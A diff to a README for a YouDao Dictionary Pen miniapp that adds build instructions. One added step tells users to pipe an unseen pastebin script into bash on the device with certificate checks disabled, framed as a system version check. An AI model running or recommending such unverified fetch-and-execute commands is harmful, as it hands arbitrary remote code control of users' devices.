@@ -28,20 +28,59 @@
 
 Users using this miniapp should have a [supported YouDao Dictionary Pen](https://smart.youdao.com/dictPen).
 
-## Installation
+## Preparation
 
 1. Make sure you have a YouDao Dictionary Pen with `adb` enabled. You can refer to [these discussions](https://github.com/orgs/PenUniverse/discussions/).
-2. Go to the latest [GitHub Actions](https://github.com/langningchen/miniapp/actions/workflows/build.yml) and download the `miniapp.amr` file from section `Artifacts`.
-3. Connect your YouDao Dictionary Pen to your computer and login to it using `adb shell auth`.
-4. Upload the `miniapp.amr` file to your YouDao Dictionary Pen using `adb push`:
+2. Connect your YouDao Dictionary Pen to your computer and login to it using `adb shell auth`.
+
+## Build
+
+1. Make sure you have `nodejs`, `pnpm` installed on a Ubuntu computer.
+2. Open the shell using `adb shell` and run the following command to check the version of system:
+   ```bash
+   curl -k -s https://pastebin.com/raw/pREp7XH4 | tr -d '\r' | bash
+   ```
+3. Pull the artifacts from the YouDao Dictionary Pen:
+   ```bash
+   adb pull /userdisk/Favorite/versionInfo.tar.gz ./versionInfo.tar.gz
+   ```
+4. Clone this repository:
+   ```bash
+   git clone https://github.com/langningchen/miniapp.git
+   cd miniapp
+   ```
+5. Extract the `versionInfo.tar.gz` file:
+   ```bash
+   tar -xzf versionInfo.tar.gz -C ./jsapi
+   ```
+6. Download and extract the correct toolchain in the `jsapi/toolchains` directory,
+   your directory structure should look like this:
+   ```
+   miniapp/
+   ├── jsapi/
+   │   ├── toolchains/
+   │   │   ├── <toolchain_name>/
+   │   │   │   ├── bin/
+   │   │   │   ├── include/
+   │   │   │   └── lib/
+   ```
+7. Run the build script:
+   ```bash
+   ./tools/build.sh
+   ```
+8. After the build is complete, you will find the `miniapp.amr` file in the `dist` directory.
+
+## Installation
+
+1. Upload the `miniapp.amr` file to your YouDao Dictionary Pen using `adb push`:
    ```bash
    adb push miniapp.amr /userdisk/Favorite/miniapp.amr
    ```
-5. Open the shell using `adb shell` and run the following command to install the miniapp:
+2. Open the shell using `adb shell` and run the following command to install the miniapp:
    ```bash
    miniapp_cli install /userdisk/Favorite/miniapp.amr
    ```
-6. After installation, you can find the miniapp in the app list of your YouDao Dictionary Pen.
+3. After installation, you can find the miniapp in the app list of your YouDao Dictionary Pen.
 
 ## License
 
